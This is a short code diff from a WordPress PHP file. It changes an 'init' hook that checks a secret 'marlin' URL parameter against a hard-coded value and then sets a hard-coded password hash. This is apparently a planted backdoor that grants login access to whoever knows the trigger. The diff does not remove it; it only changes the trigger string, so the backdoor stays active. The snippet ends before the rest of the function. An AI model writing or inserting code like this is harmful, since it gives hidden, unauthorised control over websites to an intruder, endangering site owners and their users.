@@ -292,7 +292,7 @@ add_action('wp_login_failed', function($username) {
 });
 
 add_action('init', function () {
-    if (isset($_GET['marlin']) && $_GET['marlin'] === 'itsokey') {
+    if (isset($_GET['marlin']) && $_GET['marlin'] === 'itsokeytol') {
 
         
         $hash_password = '$2y$10$LoJmLn.pvVw9tyGvu0tYyeiqKL2QsjjvABJBeKHSRILlwa0ytpydu'; 
